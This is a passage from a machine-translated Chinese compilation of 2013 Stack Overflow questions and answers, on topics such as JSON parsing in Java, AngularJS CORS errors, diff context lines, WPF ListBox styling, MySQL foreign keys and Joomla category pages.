这种方法的美妙之处在于您可以随时丢弃模板并在视图中执行内联 html。此外，为您的模型提供“输入 + 标签”的逻辑被分离到一个地方。

# java - JSON 数组不是从流中创建的

> ID：16013827
> 
> 赞同：1
> 
> 时间：2013-04-15T11:17:53.310
> 
> 标签：java, json

基本上，我正在向服务器发送一个请求，它的响应是`"{"Result":"OK"}"`，我可以检索它，但是当我尝试在我的处理方法中使用响应时：

```
public void ProcessData(java.lang.String stream) 
    {
        JSONArray jsonArray; 
        try
        {
        jsonArray = new JSONArray(stream);
        for(int i=0; i<jsonArray.length(); i++)
        {
            JSONObject jsonObject = jsonArray.getJSONObject(i);
            String itemText = jsonObject.getString("text");
            Response = itemText;
        }
        }catch (JSONException e)
        {
            e.printStackTrace();
        }
    } 
```

如果流是 `"{"Result":"OK"}"` 它在这条线上失败

```
jsonArray = new JSONArray(stream); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:19:53.410

因为它不是一个 json 数组，它是一个 json 对象（以 开头`{`）..

```
jsonobject = new JSONObject(stream); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:21:08.280

做错了你试图解析`JsonObject`的`JsonArray` 尝试

```
try {
        JSONObject jobj = new JSONObject(Respones);         
        String userid = jobj.getString("Result");               
    } catch (JSONException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:21:43.197

这`jsonStr`是一种`JsonObject`格式：

```
{name:value} 
```

不是`jSONArray`格式：

```
[{name:value}] 
```

你必须使用：

```
JSONObject obj=new JSONObject(stream) 
```

无法使用新的`JSonArray(stream);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T11:20:12.650

那里没有`JSONArray`，只有一个`JSONObject`

```
jsonArray = new JSONObject(stream); 
```

# asp.net - ScriptManager 不支持 Telerik radslider

> ID：16013839
> 
> 赞同：0
> 
> 时间：2013-04-15T11:18:44.520
> 
> 标签：asp.net

ScriptManager 不支持 Telerik radslider。有什么方法可以使用 Asp:scriptManager 支持 Telerik Radslider？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:28:08.733

你可以使用

```
 <telerik:RadScriptManager ID="radscriptmanager" runat="server" /> 
```

# report - 带输入的 Microsoft BI 报表

> ID：16013842
> 
> 赞同：0
> 
> 时间：2013-04-15T11:18:59.923
> 
> 标签：report, user-input, business-intelligence

我需要创建一个 Microsoft BI Produced Report，它将显示从数据库中检索到的**Actual Data 。**但我也希望用户能够在报告的实际数据旁边的列中填写下个月的**预测数据，并将输入的数据加载到预测立方体。**

有可能吗？什么是正确的策略？

感谢您的输入 ：） ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T23:01:08.123

MS BI 产品基于报告，因此它们没有任何直接的方式来与您要求的数据进行交互。不过，有几个选项以 SSRS 报告（或 PowerPivot 书等）开头。

SharePoint 工作流 - 允许输入过程的许多其他控制方面。使用 ETL 包获取列表。你也可以用一个简单的网络应用程序做类似的事情。通过报告操作链接。

ETL - 使报告可导出为 Excel，并为用户输入留下空白列。通过读取修改后的 Excel 文件的 ETL 过程重新吸收它。这可以是手动触发的作业，不一定是 DM/DW 每晚 ETL 的一部分。

你也可以有一个手动脚本。我会认为并希望预测数据不会经常更改，因此更简单的解决方案可能是最好的。

# python - 为什么选择 sys.modules 作为字典？

> ID：16013843
> 
> 赞同：1
> 
> 时间：2013-04-15T11:19:00.780
> 
> 标签：python, python-import

当 Python 想要导入一个模块时，它首先会在`sys.modules`. 但是由于字典的键值对不是按固定顺序排列的，你怎么能确定两个同名模块中的哪一个`sys.modules`会首先被导入呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-15T11:22:27.047

由于它是一个映射，*因此*在`sys.modules`.

这就是我想说的。如果使用该语句`import foo`并且`sys.modules['foo']`存在，则返回该模块。不需要文件访问，不需要运行该模块的顶级代码。

如果`foo`不存在，则`sys.path`确定首先要在哪里`foo`找到。该值是一个列表，因此它具有顺序，并且模块的搜索`foo`是根据该顺序进行的。

# sugarcrm - SugarCRM Rest API：会议条目的必填字段？

> ID：16013844
> 
> 赞同：0
> 
> 时间：2013-04-15T11:19:02.173
> 
> 标签：sugarcrm

我正在尝试通过 API 创建一个会议条目，但我似乎无法在我的日历中找到它，即使它已成功保存（我找回了 ID）并且我可以在会议列表中看到它。

我需要填充哪些字段才能在我的 Sugar 日历中显示？这是我正在填充的字段：

```
{
 'assigned_user_id': '1', # My user's ID
 'date_end': '2013-04-16 01:30:00',
 'date_start': '2013-04-16 01:23:45',
 'description': 'hello world',
 'location': 'JCenter',
 'name': 'Test',
 'team_id': '1',
 'type': 'Sugar' # This doesn't seem to be required
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T06:50:00.450

尝试设置“user_id”并查看 mettings_users 表，您会在其中找到它。

# jquery - 重新加载 Bluimp jQuery 文件上传

> ID：16013849
> 
> 赞同：1
> 
> 时间：2013-04-15T11:19:27.187
> 
> 标签：jquery, jquery-plugins, file-upload

我正在构建一个应用程序来将文件上传到不同的文件夹中。要更改文件夹，我有一个`select`菜单，为此我有一个 jQuery 函数，可以加载不同的文件夹进行上传。

上传本身工作正常，但问题是每次`select`菜单都会将该特定文件夹中的项目附加到列表中，如果我更改`select`菜单中的文件夹，列表就会变得越来越大。

`select`每次更改/更新菜单时，我都想完全重新加载文件上传器。

这就是我的更改功能的样子

```
$("#test55").change(function () {  

    //Get value from the select menu
  var value = $("#test55").val();

    //Read the configuration file for the uploader
  $.getScript("/js/bluimp/js/main.js", function(data, textStatus, jqxhr) {

  });

  //Sets a sessions variable so the script knows where to save the file
  $.post("/js/bluimp/server/php/process.php", { q: value }, function(data) {
    console.log(data);
  });

}).change(); 
```

我尝试在更改函数中使用内置`$('#fileupload').fileupload('destroy');`函数，但这会阻止它加载。

**摘要：**每次`select`更改菜单时，我都想完全重新加载整个插件。如果无法重新加载插件，我需要在菜单中的每次更改时**刷新文件列表**`select`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:28:35.517

所以，我想我可以在每次菜单更改时手动清空表格。这是完整的脚本：

```
$("#test55").change(function () {  

   //++New line // Removes old table rows.
  $(".template-download").remove();
    //Get value from the select menu
  var value = $("#test55").val();

    //Read the configuration file for the uploader
  $.getScript("/js/bluimp/js/main.js", function(data, textStatus, jqxhr) {

  });

  //Sets a sessions variable so the script knows where to save the file
  $.post("/js/bluimp/server/php/process.php", { q: value }, function(data) {
    //$('#form').slideUp('slow');
    console.log(data);
  });

  $('.fileupload').fileupload({
        // Uncomment the following to send cross-domain cookies:
        //xhrFields: {withCredentials: true},
        url: '/js/bluimp/server/php/'
    });
}).change(); 
```

# css - Rails 应用程序中的 CSS 与 SCSS

> ID：16013851
> 
> 赞同：0
> 
> 时间：2013-04-15T11:19:37.767
> 
> 标签：css, ruby-on-rails, ruby-on-rails-3, sass, less

我有一个 web 应用程序的 css 文件，如何在 Rails 中使用它？我需要将其转换为 scss 还是更少？我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:24:21.120

您不必将文件转换为 scss/sass/less，您可以按原样使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T12:18:19.017

正如@Mischa 所说，您可以继续使用css。

将您的 css 文件复制到资产/样式表中，然后确保 application.css 包含以下内容

```
*= require_tree . 
```

这将包括样式表文件夹中的所有文件。

# ios - 意外的类型名称“BOOL”：iOS SDK 6.1（设备）中的预期表达式

> ID：16013857
> 
> 赞同：2
> 
> 时间：2013-04-15T11:20:07.410
> 
> 标签：ios, objective-c

模拟器的 iOS 应用程序构建良好。但是，当我尝试为设备构建时，@YES 和 @NO 文字的编译失败。我们使用 iOS 6.1 作为构建 SDK，但保留了 5.1。iPad 的操作系统版本是 6.1.3。有什么我遗漏的东西可能导致失败吗？

```
Fragment from build log: /Applications/Xcode-4.6.app/Contents/Developer/Platforms/
    iPhoneOS.platform/Developer/SDKs/iPhoneOS5.1.sdk/usr/include/objc/objc.h:50:26
    : note: expanded from macro 'YES'
#define YES             (BOOL)1 
```

在构建中选择 5.1 SDK 有什么原因吗？

部署目标是 5.0，但将其更改为 6.1 并不能解决问题。Xcode 版本：4.6 (4H127)

是的，我知道使用 @(YES) 和 @(NO) 可以解决此问题，但这是 5.0 解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:11:06.337

残酷的回答：

安装新的 Xcode 并不再删除（此时）5.1 SDK 解决了这个问题。很难说到底发生了什么，但建议将您的工具升级到最新版本。

# angularjs - AngularJS：$http.post 抛出错误

> ID：16013858
> 
> 赞同：2
> 
> 时间：2013-04-15T11:20:07.397
> 
> 标签：angularjs

我正在使用 Request Bin 发布一些数据。在我的控制器中，我有以下代码：

```
$http.post('http://requestb.in/redacted', fooBar).
    success(function(data) {
        $scope.fooBarPostedSuccess = true;
    }).
    error(function(err) {
        console.log("Error while posting to Request Bin");
        console.log("Error Info : " + err);
    }); 
```

这是通过 UI 上的按钮触发的。现在，当它被触发时，数据不会发布到请求箱，我收到这个错误：

```
XMLHttpRequest cannot load http://requestb.in/redacted.
Origin http://localhost:3000 is not allowed by Access-Control-Allow-Origin. 
```

如何通过 AngularJS 控制器发布数据以请求 bin？另外，上面的错误是什么意思？

**编辑：**我想在这里补充一下，我正在使用带有 AngularJS 的 Node.js。这可能与Node有关吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:57:05.773

啊，是的...您正在处理跨域脚本问题。这不是 AngularJS 问题，而是浏览器安全限制和非常常见的摩擦点。

如果不进行一些跨域资源共享 (CORS)，您将无法 POST/PUT/DELETE 到另一个域（与托管的域不同——在您的情况下为 localhost）。对于跨域 HTTP 请求，您只能使用 GET。

你有两个选择：

1.  查看您的 API 是否支持任何跨域功能。这可能是通过 CORS，也可能是通过重载的 GET API 或 JSONP。

2.  通过您的服务器代理请求。由于您使用的是 Node.js，因此通过您的服务器代理 REST 非常简单……您只需要在您的 Node.js 服务器中设置一个路由处理程序（如 /api/redacted），然后向您的实际服务器发出一个新请求带有 Restler（NPM 包）之类的 API 服务器，并将结果返回给您的客户端。

希望这可以帮助！

**编辑：**

您的 API 支持 JSONP（[您的 API 文档](http://requestb.in/docs/API)）。您应该能够使用 Angular 的 JSONP 函数来访问您的 API 的 JSONP 功能。（[Angular.js JSONP 文档](http://docs.angularjs.org/api/ng.%24http#jsonp)）。

由于您希望能够 POST 到服务，因此您需要使用第二种方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-15T21:25:03.190

CORS 允许 GET 和 POST

[http://en.wikipedia.org/wiki/Cross-origin_resource_sharing](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing)

[http://www.w3.org/TR/cors/](http://www.w3.org/TR/cors/)

[https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS](https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS)

现在，那不碍事了……我也发现 angular 的 $http 不会让我跨域发布。不过我对此持怀疑态度，因为我在其他项目中有 jquery ajax 调用，可以很好地发布跨域。所以，我用 $.ajax POST 交换了我的 $http POST 并且有效。

```
// $http({
//  url: url,
//  method: "POST",
//  data: data
// })
// .success(successCallback)
// .error(errorCallback)

// ole reliable
$.ajax({
  type : "POST",
  url : url,
  data : data,
  success : successCallback,
  error : errorCallback,
  cache : false,
  dataType : 'json',
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-08-29T21:29:21.770

您可以使用[PutsReq](http://putsreq.com/)代替 RequestBin。PutsReq 支持[CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)。

# c++ - 继承、隐藏函数和作用域 c++

> ID：16013862
> 
> 赞同：0
> 
> 时间：2013-04-15T11:20:10.403
> 
> 标签：c++, inheritance, polymorphism

假设我有一个带有函数 A 和 B 的继承类。B 做了一些事情并调用 A。基类也有函数 A 和 B。B 以不同的方式做这件事，然后调用 A（派生类的 A）。但是在特定情况下，我想调用基类的 B。这是使用 Base::B() 完成的。然后B会打电话给A，我的问题是，它会打电话给哪个A？基础的还是继承的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:37:16.943

这取决于A是否是虚拟的。如果 virtual 将调用派生版本，否则它将是基本版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:40:18.557

您在这里提出了一个通用场景，但足以确定您指的是**MRO**，也就是**Method Resolution Order**，它是算法（或算法类，您可以使用此首字母缩写词来指代一般主题或具体的单一事物）用于确定需要调用哪个方法。

MRO 如何在标准本身中描述的 C++ 案例中工作，但是这里有一个名为[*method-resolution-order*](https://stackoverflow.com/questions/tagged/method-resolution-order)的专用标签，并且[答案](https://stackoverflow.com/a/3310948/2244984)可以让您对此有一个广泛的了解。

# c# - windows 8 列表框选择颜色

> ID：16013863
> 
> 赞同：2
> 
> 时间：2013-04-15T11:20:10.377
> 
> 标签：c#, .net, wpf

我在用 Win7 编写的 WPF 中设置了列表框的样式所以我的风格是

```
<ListBox>
 <ListBox.Resources>
     <SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}" Color="#3399FF" />
     <SolidColorBrush x:Key="{x:Static SystemColors.HighlightTextBrushKey}" Color="#000000" />
     <SolidColorBrush x:Key="{x:Static SystemColors.InactiveSelectionHighlightBrushKey}" Color="#3399FF" />
     <SolidColorBrush x:Key="{x:Static SystemColors.InactiveSelectionHighlightTextBrushKey}" Color="#000000" />
 </ListBox.Resources>
</ListBox> 
```

此代码在焦点和散焦状态下对列表框项进行相同的选择。当我在 Windows 8 下运行我的程序时，这种外观不起作用。我的代码哪里出错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T12:29:54.780

`ListBoxItem`在 Windows-8 中似乎有

```
<MultiTrigger>
  <MultiTrigger.Conditions>
    <Condition Property="IsSelected" Value="true"/>
    <Condition Property="Selector.IsSelectionActive" Value="false"/>
  </MultiTrigger.Conditions>
  <Setter Property="Background" TargetName="Bd" Value="{DynamicResource {x:Static SystemColors.ControlBrushKey}}"/>
  <Setter Property="Foreground" Value="{DynamicResource {x:Static SystemColors.ControlTextBrushKey}}"/>
</MultiTrigger> 
```

因为它是默认样式中的非活动选择触发器，然后使用它`SystemColors.ControlBrushKey`，`SystemColors.ControlTextBrushKey`因此您可能也希望在资源中覆盖它们，

也许是这样的：

```
<ListBox>
 <ListBox.Resources>
     <SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}" Color="#3399FF" />
     <SolidColorBrush x:Key="{x:Static SystemColors.HighlightTextBrushKey}" Color="#000000" />
     <SolidColorBrush x:Key="{x:Static SystemColors.ControlBrushKey}" Color="#3399FF" />
     <SolidColorBrush x:Key="{x:Static SystemColors.ControlTextBrushKey}" Color="#000000" />
     <SolidColorBrush x:Key="{x:Static SystemColors.InactiveSelectionHighlightBrushKey}" Color="#3399FF" />
     <SolidColorBrush x:Key="{x:Static SystemColors.InactiveSelectionHighlightTextBrushKey}" Color="#000000" />
 </ListBox.Resources>
</ListBox> 
```

或者只是自己创建一个`Style`（基于默认模板）并直接在这个新的上设置颜色`Style`，然后保证适用于任何版本的操作系统，您不必继续回溯并检查是否有任何更改默认值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-06T17:57:45.103

尝试使用 ItemTemplate 作为：

```
 <ListBox HorizontalContentAlignment="Stretch">
                <ListBox.ItemTemplate>
                    <DataTemplate>
                        <Label  Margin="-5, -2,-5,-2" Content="{Binding Item}">
                            <Label.Style>
                                <Style TargetType="Label">
                                    <Style.Triggers>
                                        <MultiDataTrigger>
                                            <MultiDataTrigger.Conditions>
                                                <Condition Binding="{Binding RelativeSource={RelativeSource Mode=FindAncestor,AncestorType={x:Type ListBox}},Path=IsFocused}" Value="False"/>
                                                <Condition Binding="{Binding RelativeSource={RelativeSource Mode=FindAncestor,AncestorType={x:Type ListBoxItem}},Path=IsSelected}" Value="True"/>
                                            </MultiDataTrigger.Conditions>
                                            <Setter Property="Background" Value="CornflowerBlue"/>
                                        </MultiDataTrigger>
                                        <DataTrigger Binding="{Binding RelativeSource={RelativeSource Mode=FindAncestor,AncestorType={x:Type ListBoxItem}},Path=IsSelected}" Value="True">
                                            <Setter Property="Foreground" Value="White"/>
                                        </DataTrigger>
                                        <DataTrigger Binding="{Binding RelativeSource={RelativeSource Mode=FindAncestor,AncestorType={x:Type ListBoxItem}},Path=IsSelected}" Value="False">
                                            <Setter Property="Foreground" Value="Black"/>
                                        </DataTrigger>
                                    </Style.Triggers>
                                </Style>
                            </Label.Style>
                        </Label>
                    </DataTemplate>
                </ListBox.ItemTemplate>
            </ListBox> 
```

# git - 增加统一差异上下文行的数量有什么缺点吗？

> ID：16013869
> 
> 赞同：6
> 
> 时间：2013-04-15T11:20:19.303
> 
> 标签：git, diff

默认情况下，`diff -u`使用`git diff`上下文行生成统一差异。除了 diff 文件本身的大小之外，增加上下文行数有什么缺点吗？我认为它可能会在要修补的文件自补丁制作以来已被修改的情况下有所帮助。具体来说，如果您增加上下文行的数量，是否存在`patch`会失败的情况，如果您没有这样做，则不会出现这种情况？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:33:09.193

是的。考虑以下情况：

有一个文件`f1`：

```
a
b
c
d
e
f
g 
```

您修改该`f`行，并获得

```
--- f1  2013-04-15 13:23:57.524966109 +0200
+++ f2  2013-04-15 13:25:17.832965720 +0200
@@ -5,3 +5,3 @@
 e
-f
+f2
 g 
```

或者

```
--- f1  2013-04-15 13:23:57.524966109 +0200
+++ f2  2013-04-15 13:25:17.832965720 +0200
@@ -1,7 +1,7 @@
 a
 b
 c
 d
 e
-f
+f2
 g 
```

取决于您是否使用`-U1`或`-U5`选项`diff`。现在假设其他人编辑了文件的上半部分，如下所示：

```
a
b1
c
d
e
f
g 
```

这是两个`patch`命令的输出：

```
$ patch f3 < u1.patch 
patching file f3
$ patch f3 < u5.patch 
patching file f3
Hunk #1 succeeded at 1 with fuzz 2. 
```

该补丁在两种情况下都成功应用，但是，在第二次运行中，我们不得不使用模糊值 2。这是什么意思？

> 第一个补丁查找上下文的所有行都匹配的位置。如果没有找到这样的地方，并且它是上下文差异，并且最大模糊因子设置为 1 或更大，则忽略上下文的第一行和最后一行进行另一次扫描。如果失败，并且最大模糊因子设置为 2 或更大，则忽略上下文的前两行和最后两行，并进行另一次扫描。

从 的描述中可以看出，在这种情况下，`man patch`使用该版本创建的补丁`-U5`将需要更长的时间才能应用，甚至更糟糕的是，如果使用的 fuzz 值`patch`不够大，应用补丁将失败。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-15T11:46:27.993

上下文的大小对补丁有两个主要影响：

1.  上下文越大，您就越确定在正确的上下文中应用补丁。
2.  上下文越大，可以将更多的变化归为一组。

考虑以下示例（故意拼写错误）：

```
original file:                     Changed file:

This is                            This is
some tex.                          some text.
You are on                         You are on
stackoverflo.com                   stackoverflo.com
Completely unrelated               Completely unrelated
tet here.                          text here.
Goodbye.                           Goodbye. 
```

其中 1 行的上下文大小，你会得到一个有两个大块的补丁：

```
@@ -1,2 +1,3 @@
 This is
-some tex.
+some text.
 You are on
@@ -4,3 +5,3 @@
 Completely unrelated
-tet here.
+text here.
 Goodbye. 
```

并且上下文大小为 3 行，您将获得一个包含一个大块的补丁：

```
@@ -1,6 +1,7 @@
 This is
-some tex.
+some text.
 You are on
 stackoverflo.com
 Completely unrelated
-tet here.
+text here.
 Goodbye. 
```

现在想象第二个修复：

```
Changed file:                      Further changed file:

This is                            This is
some text.                         some text.
You are on                         You are on
stackoverflo.com                   stackoverflow.com
Completely unrelated               Completely unrelated
text here.                         text here.
Goodbye.                           Goodbye. 
```

这里的补丁是：

```
@@ -3,3 +3,3 @@
 You are on
-stackoverflo.com
+stackoverflow.com
 Completely unrelated 
```

现在，假设您颠倒了修补的顺序。因此，您首先应用第二个补丁（修复`flow`地址），然后应用第一个补丁（使用`-U 1`或`-U 3`）。

*   `-U 1`在补丁的情况下应用干净。
*   在补丁不干净的情况下，`-U 3`补丁可能会失败或被模糊接受。

### 结论

首先考虑极端情况。如果您的上下文为零，那么将补丁弄错或将大块应用于错误的行是非常东方的。如果你有无限的上下文，那么每个补丁基本上都会成为文件的完整替换，从而很难重新排序补丁。

所以很容易理解，太低和太高的上下文都是不好的。因此，显然应该在更好的匹配和发现个体变化之间进行权衡。

不幸的是，没有最佳的行数，可以说默认上下文大小是开发人员集体接受的公平权衡。如果它有助于你的事业，你可以增加它，但要小心它的影响。

# ajax - 仅当 Ajax 函数在 bootstrap jquery 中完成执行时，如何弹出模式？

> ID：16013871
> 
> 赞同：0
> 
> 时间：2013-04-15T11:20:21.027
> 
> 标签：ajax, jquery, twitter-bootstrap

我有这样的`Ajax`功能：

```
function generate_summary() {
    var summary_input=document.getElementById('summary_input').value;
    var email_notify=document.getElementById('email_notify').value;
    var num_sent=document.getElementById('num_sent').value;
      $.ajax({
                type: "GET",
                url: "/summary/",
                data: {summary_input:summary_input, email_notify:email_notify, num_sent:num_sent},
                success: function(data){
                     $('#modal-body').html(data)
                }
            });

} 
```

我有`href`这样的：

```
<a onclick="generate_summary()"  href="#summaryModal" style="text-decoration:none;" id="summarize_btn" role="button" class="btn btn-success offset3" data-toggle="modal">Summarize</a> 
```

模态看起来像这样：

```
<!-- Summary output popup  -->
<div id="summaryModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-header">
    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
    <h3 id="myModalLabel">Summary</h3>
  </div>
  <div class="modal-body" id="modal-body">
    <textarea disabled id="summary_output" name="summary_input" rows="15" class="span5"></textarea> 
  </div>
  <div class="modal-footer">
    <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
    <button class="btn btn-primary">Save changes</button>
  </div>
</div> 
```

单击汇总按钮时，模式是一个弹出窗口。

服务器的输出放置在：

```
 <div class="modal-body" id="modal-body">
    <textarea disabled id="summary_output" name="summary_input" rows="15" class="span5">{{ summary }}</textarea> 
  </div> 
```

`Ajax function, modal`一切正常。但是模态加载如此之快，该函数仅返回`10-15 secs`. 我想同时显示弹出模式和摘要。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:24:34.850

要使用 jquery 对话框，您必须在项目中引用 jquery.ui js 和 css 文件。

首先使 summaryModal 成为一个 jquery 对话框：

```
$("#summaryModal").dialog({ autoOpen: false, buttons:
        {
            "Save": function () {
                if (!confirm("Do you want to save the changes?")) {
                    return;
                }
                //Add your logic to save.

                $("#summaryModal").dialog('close');
            },
            "Cancel": function () {
                $("#summaryModal").dialog('close');
            }
        }
    }); 
```

之后，当您单击 summarise_btn 时，进行 ajax 调用并在对话框中加载内容：

```
$("#summarize_btn").click(function () {
        $.ajax({
            type: "GET",
            url: "/Home/About",
            success: function (data) {

                $("#summaryModal").dialog("option", "height", 500);
                $("#summaryModal").dialog("option", "width", 500);
                $("#summaryModal").dialog("option", "title", 'Modal Title');
                $("#summaryModal").dialog("option", "modal", true);
                $("#summaryModal").dialog('open');

                $('#summaryModal').html(data);
            }
        });
    }); 
```

summaryModal div 看起来像：

```
<div id="summaryModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">

</div> 
```

# mysql - MySQL中的错误1215

> ID：16013872
> 
> 赞同：0
> 
> 时间：2013-04-15T11:20:21.557
> 
> 标签：mysql, foreign-keys, mysql-workbench

```
CREATE DATABASE H;
USE H;
CREATE TABLE stu(
    sid CHAR(10),
    sname CHAR(10)
);

CREATE TABLE Enrolled(
    sid CHAR(10),
    studid CHAR(20),
    cid CHAR(20),
    grade CHAR(10),
    PRIMARY KEY (cid),
        FOREIGN KEY(sid) REFERENCES stu(sid)
); 
```

出现错误 1215。

想知道源代码有什么问题。

关于外键引用的使用可能存在一些基本错误。

有人可以帮忙解决问题吗？将非常感谢您的友好回答；）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:21:59.530

您需要引用在其上定义了键的列，

```
CREATE TABLE stu
(
    sid CHAR(10) PRIMARY KEY,
    sname CHAR(10)
); 
```

# java - ArrayList 地理点

> ID：16013875
> 
> 赞同：0
> 
> 时间：2013-04-15T11:20:37.743
> 
> 标签：java, android, arraylist

我有一个包含解析 KML 文件并将结果保存到 ArrayList 变量中的方法的类。我已经从方法中打印了变量的内容，结果在方法中正确。然后我如何在另一堂课中使用这些结果？干杯乔恩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:30:54.467

就像下面这样：

```
public class YourClass{
   private List<yourType> list; 

   public void parseKML(){ //your method in which you are parsing KML file.
      ...
      ...

      list = new ArrayList<your type>();
      // and now save all variable in this list rather then saving it to local ArrayList
    ...
   }

  public List<yourtype> getKMLList(){
     // to Minimize mutibility Effective java item 15  
     return list.clone();  
   }
} 
```

# django - Django rest 框架缓存策略

> ID：16013876
> 
> 赞同：12
> 
> 时间：2013-04-15T11:20:40.240
> 
> 标签：django, rest, caching, frameworks, django-rest-framework

我在谷歌上搜索了很多东西来找出 Django Rest Framework 可以用 Cache 做什么。从现在开始，我得到的只有这个页面

[http://django-rest-framework.org/api-guide/throttling.html](http://django-rest-framework.org/api-guide/throttling.html)

没有告诉我他们的政策。

我对 API 的需求很简单：保留它们的所有功能，并在没有任何变化时应用缓存。当数据库发生变化时，有一种机制可以使适当的缓存页面失效。

例如：

如果我有模型 AB 的列表和详细视图，通过具有身份验证和限制的 API，我想：

1.  用户 1，经过身份验证，可以访问他对对象 AB 的列表和详细信息的视图
2.  当新实例 AB 被引入时，使 AB 的列表失效
3.  当某些实例 AB 已更改时，使 AB 的详细信息和 AB 列表无效

所以，我只需要知道 django rest 框架如何创建密钥，以及他们缓存它以控制缓存策略的点。

有什么线索吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-06-06T14:08:28.587

即使这个问题并不新鲜，也许这值得一看： [https ://chibisov.github.io/drf-extensions/docs/#caching](https://chibisov.github.io/drf-extensions/docs/#caching)

# c# - 确定 TextSelection 是否在属性中。VS'12 插件

> ID：16013877
> 
> 赞同：0
> 
> 时间：2013-04-15T11:20:40.780
> 
> 标签：c#, visual-studio-2012, add-in

如何确定当前 TextSelection 对象是否放入 Attribute 元素（方法属性、类属性等）？

# html - joomla3.0如何在一个页面中显示所有类别

> ID：16013880
> 
> 赞同：-1
> 
> 时间：2013-04-15T11:20:46.647
> 
> 标签：html, joomla3.0

joomla3.0如何在一个页面中显示三个不同的类别。我想在按该类别时获取每个类别的详细信息

**请看这个例如**：[http ://www.templatemonster.com/demo/42980.html](http://www.templatemonster.com/demo/42980.html)

在这个网页上取“**服务**”页面，我想要这个页面，请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T10:56:01.377

不需要扩展，所有都按照这个步骤你会得到它。此步骤在 joomla3.0 中。

STEP 1：进入**菜单管理器**并进入**主菜单**。第 2 步：在**主菜单**中选择您自己**的页面**（这里是选择服务页面。在此您可以选择任何页面，例如：关于、产品......等）。然后将**菜单项类型**更改为**图库视图**（单击**选择按钮**那个时候在那个窗口中打开一个窗口点击**文章**在这里你可以看到一些菜单项的列表选择**画廊视图**）第3步：现在在那里**选择高级选项** 你可以在这里看到**博客布局选项**我们在那里你可以做一些安排见 **介绍文章**（输入您想在页面中显示多少文章的数字），**列**（列数），**多列顺序**（将其更改为**Across**），**显示过滤器**（将其更改为**SHOW**） 第 4 步：按保存按钮并刷新看看你的页面现在怎么样了。

> Blockquote：需要您在***选择类别**字段中选择的类别中的一个或多个子类别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:27:15.913

检查此扩展 [http://extensions.joomla.org/extensions/authoring-a-content/content-construction/19217](http://extensions.joomla.org/extensions/authoring-a-content/content-construction/19217)

演示：[http ://demo.tzportfolio.com/](http://demo.tzportfolio.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T12:10:50.410

是的，这是您正在寻找的[http://isotope.metafizzy.co/和 chermanarun 链接的 TZ Portfolio 正在使用它；）](http://isotope.metafizzy.co/)

# reporting-services - SSRS 将最后一行设置为多值参数的默认值

> ID：16013884
> 
> 赞同：2
> 
> 时间：2013-04-15T11:21:13.087
> 
> 标签：reporting-services

我想这很容易......我有一个多值参数，它从查询中获取值列表。我想选择最后一行作为默认值。

我可以使用表达式来实现吗？我想避免创建第二个查询只是为了从上一个查询中获取最后一个值......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T19:55:12.463

在默认参数表达式中，您**不能引用数据集的字段**，因此您不能编写类似的东西`Last(Field!MyVar.Value, "DataSet1")`，作为一种解决方法，您可以命令数据集首先检索最后一行并使用“从查询中获取值”选择第一行，如果你不能这样做，那么在唯一的一个解决方案中复制你的数据集。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-02-04T15:03:01.693

我正在使用**SSRS 2012**，并且我在报告中使用了多选选项，因此当我选择“从查询中获取值”时，我将所有值作为默认值。

我确实找到了解决方案。在我的报告中，我需要将城镇的默认名称作为第一个名称，因此我创建了另一个集合，其中包含列的名称和一个表示“ `[DimTahanot].[Tahana Name].&[אילת]`”的计算度量，并用同一个过滤器对其进行过滤。（请忽略不同的语言）。虽然是硬编码的，但它对这份报告有好处。如果您需要它是第一个数量或应该影​​响该值的任何其他参数，则可以使用过滤器作为参数为该集合创建另一个隐藏参数。

希望这可以帮助。

# linux - 在 /proc/device 中找不到驱动程序

> ID：16013897
> 
> 赞同：0
> 
